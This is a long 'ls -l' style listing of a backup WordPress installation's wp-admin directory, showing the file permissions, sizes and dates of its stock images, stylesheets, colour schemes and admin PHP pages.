-rw-r--r-- 1 www-data www-data 1003 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/list.png
-rw-r--r-- 1 www-data www-data 825 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/xit-2x.gif
-rw-r--r-- 1 www-data www-data 206 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/media-button-music.gif
-rw-r--r-- 1 www-data www-data 97 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/sort-2x.gif
-rw-r--r-- 1 www-data www-data 719 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/generic.png
-rw-r--r-- 1 www-data www-data 142 Sep 26  2012 /var/www/backup_wordpress/wp-admin/images/align-right-2x.png
-rw-r--r-- 1 www-data www-data 924 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/stars.png
-rw-r--r-- 1 www-data www-data 147 Sep 26  2012 /var/www/backup_wordpress/wp-admin/images/align-center-2x.png
-rw-r--r-- 1 www-data www-data 2157 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/post-formats.png
-rw-r--r-- 1 www-data www-data 323 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/media-button.png
-rw-r--r-- 1 www-data www-data 2001 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/mask.png
-rw-r--r-- 1 www-data www-data 8023 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/icons32.png
-rw-r--r-- 1 www-data www-data 200 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/media-button-image.gif
-rw-r--r-- 1 www-data www-data 234 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/resize-2x.gif
-rw-r--r-- 1 www-data www-data 5142 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/post-formats32.png
-rw-r--r-- 1 www-data www-data 2450 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/post-formats-vs.png
-rw-r--r-- 1 www-data www-data 1523 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/list-2x.png
-rw-r--r-- 1 www-data www-data 12672 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/menu-2x.png
-rw-r--r-- 1 www-data www-data 114 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/comment-grey-bubble.png
-rw-r--r-- 1 www-data www-data 181 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/xit.gif
-rw-r--r-- 1 www-data www-data 509 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/align-right.png
-rw-r--r-- 1 www-data www-data 539 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/yes.png
-rw-r--r-- 1 www-data www-data 5395 Mar  9  2016 /var/www/backup_wordpress/wp-admin/images/w-logo-white.png
-rw-r--r-- 1 www-data www-data 248 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/media-button-other.gif
-rw-r--r-- 1 www-data www-data 400 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/date-button.gif
-rw-r--r-- 1 www-data www-data 5086 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/menu-vs.png
-rw-r--r-- 1 www-data www-data 3113 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/w-logo-blue.png
-rw-r--r-- 1 www-data www-data 2480 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/wordpress-logo.png
-rw-r--r-- 1 www-data www-data 12453 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/menu-vs-2x.png
-rw-r--r-- 1 www-data www-data 4162 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/spinner.gif
-rw-r--r-- 1 www-data www-data 149 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/resize-rtl.gif
-rw-r--r-- 1 www-data www-data 143 Sep 26  2012 /var/www/backup_wordpress/wp-admin/images/align-left-2x.png
-rw-r--r-- 1 www-data www-data 6047 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/wheel.png
-rw-r--r-- 1 www-data www-data 398 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/bubble_bg.gif
-rw-r--r-- 1 www-data www-data 507 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/bubble_bg-2x.gif
-rw-r--r-- 1 www-data www-data 40626 Jun 30  2015 /var/www/backup_wordpress/wp-admin/images/browser.png
-rw-r--r-- 1 www-data www-data 233 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/resize-rtl-2x.gif
-rw-r--r-- 1 www-data www-data 5039 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/menu.png
-rw-r--r-- 1 www-data www-data 21770 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/icons32-2x.png
-rw-r--r-- 1 www-data www-data 2209 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/wpspin_light.gif
-rw-r--r-- 1 www-data www-data 13170 Jan 14  2016 /var/www/backup_wordpress/wp-admin/edit-comments.php
-rw-r--r-- 1 www-data www-data 10460 Sep 26  2015 /var/www/backup_wordpress/wp-admin/update.php
-rw-r--r-- 1 www-data www-data 2841 Jan 18  2016 /var/www/backup_wordpress/wp-admin/load-styles.php
-rw-r--r-- 1 www-data www-data 696 Sep  2  2015 /var/www/backup_wordpress/wp-admin/press-this.php
-rw-r--r-- 1 www-data www-data 5311 Oct  6  2015 /var/www/backup_wordpress/wp-admin/plugin-install.php
-rw-r--r-- 1 www-data www-data 4207 Sep 17  2015 /var/www/backup_wordpress/wp-admin/async-upload.php
-rw-r--r-- 1 www-data www-data 4631 Feb 25  2016 /var/www/backup_wordpress/wp-admin/my-sites.php
-rw-r--r-- 1 www-data www-data 21163 Feb 23  2016 /var/www/backup_wordpress/wp-admin/plugins.php
-rw-r--r-- 1 www-data www-data 10968 Mar 27  2016 /var/www/backup_wordpress/wp-admin/admin.php
-rw-r--r-- 1 www-data www-data 17245 Sep 25  2015 /var/www/backup_wordpress/wp-admin/custom-background.php
-rw-r--r-- 1 www-data www-data 211 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-admin.php
-rw-r--r-- 1 www-data www-data 4723 Apr  9  2016 /var/www/backup_wordpress/wp-admin/credits.php
-rw-r--r-- 1 www-data www-data 7843 Oct 19  2015 /var/www/backup_wordpress/wp-admin/post.php
-rw-r--r-- 1 www-data www-data 29896 Apr  6  2016 /var/www/backup_wordpress/wp-admin/update-core.php
-rw-r--r-- 1 www-data www-data 17845 Mar  9  2016 /var/www/backup_wordpress/wp-admin/users.php
-rw-r--r-- 1 www-data www-data 228 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-sites.php
-rw-r--r-- 1 www-data www-data 7052 Jun 23  2015 /var/www/backup_wordpress/wp-admin/admin-header.php
-rw-r--r-- 1 www-data www-data 5017 Sep  8  2015 /var/www/backup_wordpress/wp-admin/revision.php
-rw-r--r-- 1 www-data www-data 1686 Feb 25  2016 /var/www/backup_wordpress/wp-admin/admin-post.php
-rw-r--r-- 1 www-data www-data 230 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-themes.php
-rw-r--r-- 1 www-data www-data 320 Sep 24  2013 /var/www/backup_wordpress/wp-admin/moderation.php
-rw-r--r-- 1 www-data www-data 19662 Feb 23  2016 /var/www/backup_wordpress/wp-admin/themes.php
-rw-r--r-- 1 www-data www-data 8399 Sep 10  2015 /var/www/backup_wordpress/wp-admin/options-reading.php
-rw-r--r-- 1 www-data www-data 7356 Mar 10  2016 /var/www/backup_wordpress/wp-admin/edit-form-comment.php
-rw-r--r-- 1 www-data www-data 15112 Feb 23  2016 /var/www/backup_wordpress/wp-admin/options-general.php
-rw-r--r-- 1 www-data www-data 15051 Jan  1  2016 /var/www/backup_wordpress/wp-admin/options-permalink.php
-rw-r--r-- 1 www-data www-data 20676 Jan 15  2016 /var/www/backup_wordpress/wp-admin/edit-tags.php
-rw-r--r-- 1 www-data www-data 6520 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/deprecated-media.css
-rw-r--r-- 1 www-data www-data 612 Nov 17  2013 /var/www/backup_wordpress/wp-admin/css/farbtastic-rtl.css
-rw-r--r-- 1 www-data www-data 37268 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/themes.css
-rw-r--r-- 1 www-data www-data 5322 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/deprecated-media.min.css
-rw-r--r-- 1 www-data www-data 15872 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/admin-menu-rtl.min.css
-rw-r--r-- 1 www-data www-data 4172 Jan 25  2016 /var/www/backup_wordpress/wp-admin/css/login.css
-rw-r--r-- 1 www-data www-data 16167 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/dashboard-rtl.min.css
-rw-r--r-- 1 www-data www-data 1931 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/color-picker-rtl.min.css
-rw-r--r-- 1 www-data www-data 19215 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/media-rtl.min.css
-rw-r--r-- 1 www-data www-data 23799 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/media.css
-rw-r--r-- 1 www-data www-data 3691 Nov 19  2015 /var/www/backup_wordpress/wp-admin/css/l10n.css
-rw-r--r-- 1 www-data www-data 34187 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/press-this.css
-rw-r--r-- 1 www-data www-data 8655 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/widgets.min.css
-rw-r--r-- 1 www-data www-data 5322 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/deprecated-media-rtl.min.css
-rw-r--r-- 1 www-data www-data 11632 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/customize-widgets.css
-rw-r--r-- 1 www-data www-data 22467 Apr  5  2016 /var/www/backup_wordpress/wp-admin/css/edit.min.css
-rw-r--r-- 1 www-data www-data 10587 Feb 18  2016 /var/www/backup_wordpress/wp-admin/css/revisions-rtl.css
-rw-r--r-- 1 www-data www-data 20688 Mar 30  2016 /var/www/backup_wordpress/wp-admin/css/customize-nav-menus-rtl.css
-rw-r--r-- 1 www-data www-data 10169 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/ie.min.css
-rw-r--r-- 1 www-data www-data 34209 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/press-this-rtl.css
-rw-r--r-- 1 www-data www-data 948 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/site-icon-rtl.css
-rw-r--r-- 1 www-data www-data 3694 Nov 19  2015 /var/www/backup_wordpress/wp-admin/css/l10n-rtl.css
-rw-r--r-- 1 www-data www-data 49402 Mar 23  2016 /var/www/backup_wordpress/wp-admin/css/common-rtl.min.css
-rw-r--r-- 1 www-data www-data 30782 Mar 22  2016 /var/www/backup_wordpress/wp-admin/css/customize-controls-rtl.min.css
-rw-r--r-- 1 www-data www-data 16921 Mar 30  2016 /var/www/backup_wordpress/wp-admin/css/customize-nav-menus.min.css
-rw-r--r-- 1 www-data www-data 8420 Apr  9  2016 /var/www/backup_wordpress/wp-admin/css/about-rtl.css
-rw-r--r-- 1 www-data www-data 5807 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/install-rtl.min.css
-rw-r--r-- 1 www-data www-data 22476 Apr  5  2016 /var/www/backup_wordpress/wp-admin/css/edit-rtl.min.css
-rw-r--r-- 1 www-data www-data 11976 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/ie.css
-rw-r--r-- 1 www-data www-data 7139 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/install.css
-rw-r--r-- 1 www-data www-data 9452 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/customize-widgets.min.css
-rw-r--r-- 1 www-data www-data 2423 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/l10n.min.css
-rw-r--r-- 1 www-data www-data 20620 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/dashboard.css
-rw-r--r-- 1 www-data www-data 27035 Mar  4  2016 /var/www/backup_wordpress/wp-admin/css/press-this.min.css
-rw-r--r-- 1 www-data www-data 15186 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/nav-menus.css
-rw-r--r-- 1 www-data www-data 10888 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/widgets-rtl.css
-rw-r--r-- 1 www-data www-data 10572 Feb 18  2016 /var/www/backup_wordpress/wp-admin/css/revisions.css
-rw-r--r-- 1 www-data www-data 4186 Jan 25  2016 /var/www/backup_wordpress/wp-admin/css/login-rtl.css
-rw-r--r-- 1 www-data www-data 1293 Jul 29  2015 /var/www/backup_wordpress/wp-admin/css/press-this-editor.css
-rw-r--r-- 1 www-data www-data 8698 Feb 18  2016 /var/www/backup_wordpress/wp-admin/css/revisions-rtl.min.css
-rw-r--r-- 1 www-data www-data 19214 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/forms.min.css
-rw-r--r-- 1 www-data www-data 1928 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/color-picker.min.css
-rw-r--r-- 1 www-data www-data 12135 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/nav-menus.min.css
-rw-r--r-- 1 www-data www-data 29158 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/themes.min.css
-rw-r--r-- 1 www-data www-data 10175 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/ie-rtl.min.css
-rw-r--r-- 1 www-data www-data 7140 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/install-rtl.css
-rw-r--r-- 1 www-data www-data 19226 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/forms-rtl.min.css
-rw-r--r-- 1 www-data www-data 19214 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/media.min.css
-rw-r--r-- 1 www-data www-data 27057 Mar  4  2016 /var/www/backup_wordpress/wp-admin/css/press-this-rtl.min.css
-rw-r--r-- 1 www-data www-data 28761 Apr  5  2016 /var/www/backup_wordpress/wp-admin/css/edit-rtl.css
-rw-r--r-- 1 www-data www-data 11983 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/ie-rtl.css
-rw-r--r-- 1 www-data www-data 946 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/site-icon.css
-rw-r--r-- 1 www-data www-data 33042 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/list-tables.min.css
-rw-r--r-- 1 www-data www-data 49392 Mar 23  2016 /var/www/backup_wordpress/wp-admin/css/common.min.css
-rw-r--r-- 1 www-data www-data 502 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/farbtastic.min.css
-rw-r--r-- 1 www-data www-data 24967 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/forms.css
-rw-r--r-- 1 www-data www-data 8655 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/widgets-rtl.min.css
-rw-r--r-- 1 www-data www-data 5905 Apr  9  2016 /var/www/backup_wordpress/wp-admin/css/about.min.css
-rw-r--r-- 1 www-data www-data 11634 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/customize-widgets-rtl.css
-rw-r--r-- 1 www-data www-data 20676 Mar 30  2016 /var/www/backup_wordpress/wp-admin/css/customize-nav-menus.css
-rw-r--r-- 1 www-data www-data 29169 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/themes-rtl.min.css
-rw-r--r-- 1 www-data www-data 33070 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/list-tables-rtl.min.css
-rw-r--r-- 1 www-data www-data 6520 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/deprecated-media-rtl.css
-rw-r--r-- 1 www-data www-data 8683 Feb 18  2016 /var/www/backup_wordpress/wp-admin/css/revisions.min.css
-rw-r--r-- 1 www-data www-data 23801 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/media-rtl.css
-rw-r--r-- 1 www-data www-data 611 Nov 17  2013 /var/www/backup_wordpress/wp-admin/css/farbtastic.css
-rw-r--r-- 1 www-data www-data 16167 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/dashboard.min.css
-rw-r--r-- 1 www-data www-data 2296 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/color-picker.css
-rw-r--r-- 1 www-data www-data 2299 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/color-picker-rtl.css
-rw-r--r-- 1 www-data www-data 36459 Mar 22  2016 /var/www/backup_wordpress/wp-admin/css/customize-controls.css
-rw-r--r-- 1 www-data www-data 2426 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/l10n-rtl.min.css
-rw-r--r-- 1 www-data www-data 40954 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/list-tables.css
-rw-r--r-- 1 www-data www-data 657 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/site-icon.min.css
-rw-r--r-- 1 www-data www-data 714 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/press-this-editor-rtl.min.css
-rw-r--r-- 1 www-data www-data 16933 Mar 30  2016 /var/www/backup_wordpress/wp-admin/css/customize-nav-menus-rtl.min.css
-rw-r--r-- 1 www-data www-data 19528 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/admin-menu-rtl.css
-rw-r--r-- 1 www-data www-data 1294 Jul 29  2015 /var/www/backup_wordpress/wp-admin/css/press-this-editor-rtl.css
-rw-r--r-- 1 www-data www-data 25077 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/login-rtl.min.css
-rw-r--r-- 1 www-data www-data 5806 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/install.min.css
-rw-r--r-- 1 www-data www-data 713 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/press-this-editor.min.css
-rw-r--r-- 1 www-data www-data 19513 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/admin-menu.css
-rw-r--r-- 1 www-data www-data 20619 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/dashboard-rtl.css
-rw-r--r-- 1 www-data www-data 421 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/wp-admin.min.css
-rw-r--r-- 1 www-data www-data 64949 Mar 23  2016 /var/www/backup_wordpress/wp-admin/css/common.css
-rw-r--r-- 1 www-data www-data 15857 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/admin-menu.min.css
-rw-r--r-- 1 www-data www-data 9454 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/customize-widgets-rtl.min.css
-rw-r--r-- 1 www-data www-data 12153 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/_admin.scss
-rw-r--r-- 1 www-data www-data 11631 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ocean/colors.min.css
-rw-r--r-- 1 www-data www-data 11629 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ocean/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13442 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ocean/colors-rtl.css
-rw-r--r-- 1 www-data www-data 157 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/ocean/colors.scss
-rw-r--r-- 1 www-data www-data 13444 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ocean/colors.css
-rw-r--r-- 1 www-data www-data 11631 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/midnight/colors.min.css
-rw-r--r-- 1 www-data www-data 11629 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/midnight/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13442 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/midnight/colors-rtl.css
-rw-r--r-- 1 www-data www-data 106 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/midnight/colors.scss
-rw-r--r-- 1 www-data www-data 13444 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/midnight/colors.css
-rw-r--r-- 1 www-data www-data 11631 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ectoplasm/colors.min.css
-rw-r--r-- 1 www-data www-data 11629 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13442 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.css
-rw-r--r-- 1 www-data www-data 157 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/ectoplasm/colors.scss
-rw-r--r-- 1 www-data www-data 13444 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/ectoplasm/colors.css
-rw-r--r-- 1 www-data www-data 1453 Oct  8  2015 /var/www/backup_wordpress/wp-admin/css/colors/_mixins.scss
-rw-r--r-- 1 www-data www-data 11599 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/blue/colors.min.css
-rw-r--r-- 1 www-data www-data 11597 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/blue/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13421 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/blue/colors-rtl.css
-rw-r--r-- 1 www-data www-data 249 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/blue/colors.scss
-rw-r--r-- 1 www-data www-data 13423 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/blue/colors.css
-rw-r--r-- 1 www-data www-data 11979 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/light/colors.min.css
-rw-r--r-- 1 www-data www-data 11977 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/light/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 14067 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/light/colors-rtl.css
-rw-r--r-- 1 www-data www-data 1119 Jul 15  2015 /var/www/backup_wordpress/wp-admin/css/colors/light/colors.scss
-rw-r--r-- 1 www-data www-data 14069 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/light/colors.css
-rw-r--r-- 1 www-data www-data 11631 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/sunrise/colors.min.css
-rw-r--r-- 1 www-data www-data 11629 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/sunrise/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13442 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/sunrise/colors-rtl.css
-rw-r--r-- 1 www-data www-data 166 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/sunrise/colors.scss
-rw-r--r-- 1 www-data www-data 13444 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/sunrise/colors.css
-rw-r--r-- 1 www-data www-data 1854 Apr  5  2015 /var/www/backup_wordpress/wp-admin/css/colors/_variables.scss
-rw-r--r-- 1 www-data www-data 11631 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/coffee/colors.min.css
-rw-r--r-- 1 www-data www-data 11629 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/coffee/colors-rtl.min.css
-rw-r--r-- 1 www-data www-data 13442 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/coffee/colors-rtl.css
-rw-r--r-- 1 www-data www-data 135 Feb  5  2014 /var/www/backup_wordpress/wp-admin/css/colors/coffee/colors.scss
-rw-r--r-- 1 www-data www-data 13444 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/colors/coffee/colors.css
-rw-r--r-- 1 www-data www-data 5903 Apr  9  2016 /var/www/backup_wordpress/wp-admin/css/about-rtl.min.css
-rw-r--r-- 1 www-data www-data 24980 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/forms-rtl.css
-rw-r--r-- 1 www-data www-data 477 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/wp-admin-rtl.min.css
-rw-r--r-- 1 www-data www-data 28751 Apr  5  2016 /var/www/backup_wordpress/wp-admin/css/edit.css
-rw-r--r-- 1 www-data www-data 659 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/site-icon-rtl.min.css
-rw-r--r-- 1 www-data www-data 30745 Mar 22  2016 /var/www/backup_wordpress/wp-admin/css/customize-controls.min.css
-rw-r--r-- 1 www-data www-data 25056 Feb 22  2016 /var/www/backup_wordpress/wp-admin/css/login.min.css
-rw-r--r-- 1 www-data www-data 365 Jun 29  2015 /var/www/backup_wordpress/wp-admin/css/wp-admin.css
-rw-r--r-- 1 www-data www-data 37281 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/themes-rtl.css
-rw-r--r-- 1 www-data www-data 36497 Mar 22  2016 /var/www/backup_wordpress/wp-admin/css/customize-controls-rtl.css
-rw-r--r-- 1 www-data www-data 8422 Apr  9  2016 /var/www/backup_wordpress/wp-admin/css/about.css
-rw-r--r-- 1 www-data www-data 40983 Mar 10  2016 /var/www/backup_wordpress/wp-admin/css/list-tables-rtl.css
-rw-r--r-- 1 www-data www-data 12163 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/nav-menus-rtl.min.css
-rw-r--r-- 1 www-data www-data 503 Jan 18  2016 /var/www/backup_wordpress/wp-admin/css/farbtastic-rtl.min.css
-rw-r--r-- 1 www-data www-data 10890 Feb 19  2016 /var/www/backup_wordpress/wp-admin/css/widgets.css
-rw-r--r-- 1 www-data www-data 15214 Mar  9  2016 /var/www/backup_wordpress/wp-admin/css/nav-menus-rtl.css
-rw-r--r-- 1 www-data www-data 421 Jun 29  2015 /var/www/backup_wordpress/wp-admin/css/wp-admin-rtl.css
-rw-r--r-- 1 www-data www-data 64960 Mar 23  2016 /var/www/backup_wordpress/wp-admin/css/common-rtl.css
-rw-r--r-- 1 www-data www-data 338 Dec 24  2013 /var/www/backup_wordpress/wp-admin/upgrade-functions.php
-rw-r--r-- 1 www-data www-data 2730 Sep  2  2015 /var/www/backup_wordpress/wp-admin/post-new.php
-rw-r--r-- 1 www-data www-data 2089 May 28  2015 /var/www/backup_wordpress/wp-admin/link-parse-opml.php
-rw-r--r-- 1 www-data www-data 5380 Sep 18  2015 /var/www/backup_wordpress/wp-admin/network.php
-rw-r--r-- 1 www-data www-data 700 May  6  2014 /var/www/backup_wordpress/wp-admin/user/menu.php
-rw-r--r-- 1 www-data www-data 281 Sep 24  2013 /var/www/backup_wordpress/wp-admin/user/freedoms.php
-rw-r--r-- 1 www-data www-data 270 Nov  4  2014 /var/www/backup_wordpress/wp-admin/user/profile.php
-rw-r--r-- 1 www-data www-data 275 Sep 24  2013 /var/www/backup_wordpress/wp-admin/user/about.php
-rw-r--r-- 1 www-data www-data 268 Nov  4  2014 /var/www/backup_wordpress/wp-admin/user/user-edit.php
-rw-r--r-- 1 www-data www-data 841 Apr 11  2014 /var/www/backup_wordpress/wp-admin/user/admin.php
-rw-r--r-- 1 www-data www-data 279 Sep 24  2013 /var/www/backup_wordpress/wp-admin/user/credits.php
-rw-r--r-- 1 www-data www-data 269 Nov  4  2014 /var/www/backup_wordpress/wp-admin/user/index.php
-rw-r--r-- 1 www-data www-data 7107 Dec  8  2015 /var/www/backup_wordpress/wp-admin/maint/repair.php
-rw-r--r-- 1 www-data www-data 2157 Jan 15  2016 /var/www/backup_wordpress/wp-admin/load-scripts.php
-rw-r--r-- 1 www-data www-data 403 Dec 24  2013 /var/www/backup_wordpress/wp-admin/admin-functions.php
-rw-r--r-- 1 www-data www-data 7999 Jan  1  2016 /var/www/backup_wordpress/wp-admin/options-writing.php
-rw-r--r-- 1 www-data www-data 18127 Jan 30  2016 /var/www/backup_wordpress/wp-admin/widgets.php
-rw-r--r-- 1 www-data www-data 41189 Mar  4  2016 /var/www/backup_wordpress/wp-admin/nav-menus.php
-rw-r--r-- 1 www-data www-data 8774 Mar 11  2016 /var/www/backup_wordpress/wp-admin/edit-tag-form.php
-rw-r--r-- 1 www-data www-data 15657 Feb 23  2016 /var/www/backup_wordpress/wp-admin/install.php
-rw-r--r-- 1 www-data www-data 15427 Jan 14  2016 /var/www/backup_wordpress/wp-admin/edit.php
-rw-r--r-- 1 www-data www-data 2046 Mar 11  2016 /var/www/backup_wordpress/wp-admin/term.php
-rw-r--r-- 1 www-data www-data 12854 Jan  5  2016 /var/www/backup_wordpress/wp-admin/network/site-users.php
-rw-r--r-- 1 www-data www-data 466 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/theme-install.php
-rw-r--r-- 1 www-data www-data 4672 Jan 27  2016 /var/www/backup_wordpress/wp-admin/network/upgrade.php
-rw-r--r-- 1 www-data www-data 4150 May 19  2015 /var/www/backup_wordpress/wp-admin/network/menu.php
-rw-r--r-- 1 www-data www-data 4919 Feb 24  2016 /var/www/backup_wordpress/wp-admin/network/user-new.php
-rw-r--r-- 1 www-data www-data 9394 Feb 24  2016 /var/www/backup_wordpress/wp-admin/network/site-info.php
-rw-r--r-- 1 www-data www-data 348 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/freedoms.php
-rw-r--r-- 1 www-data www-data 351 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/profile.php
-rw-r--r-- 1 www-data www-data 356 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/theme-editor.php
-rw-r--r-- 1 www-data www-data 342 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/about.php
-rw-r--r-- 1 www-data www-data 358 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/plugin-editor.php
-rw-r--r-- 1 www-data www-data 350 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/user-edit.php
-rw-r--r-- 1 www-data www-data 537 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/update.php
-rw-r--r-- 1 www-data www-data 469 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/plugin-install.php
-rw-r--r-- 1 www-data www-data 346 Sep 24  2013 /var/www/backup_wordpress/wp-admin/network/plugins.php
-rw-r--r-- 1 www-data www-data 7922 Jan  5  2016 /var/www/backup_wordpress/wp-admin/network/site-themes.php
